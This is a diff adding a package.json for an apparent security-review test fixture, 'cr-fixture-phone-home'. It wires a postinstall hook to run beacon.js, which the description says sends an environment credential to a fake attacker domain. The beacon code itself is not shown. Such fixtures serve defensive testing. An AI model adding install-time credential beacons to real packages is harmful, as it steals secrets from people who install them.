@@ -1,0 +1,10 @@
+{
+  "name": "cr-fixture-phone-home",
+  "version": "1.0.0",
+  "description": "ClaudeRabbit test fixture: a postinstall beacon that sends a credential from the environment to a fake attacker domain.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node beacon.js"
+  },
+  "license": "MIT"
+}
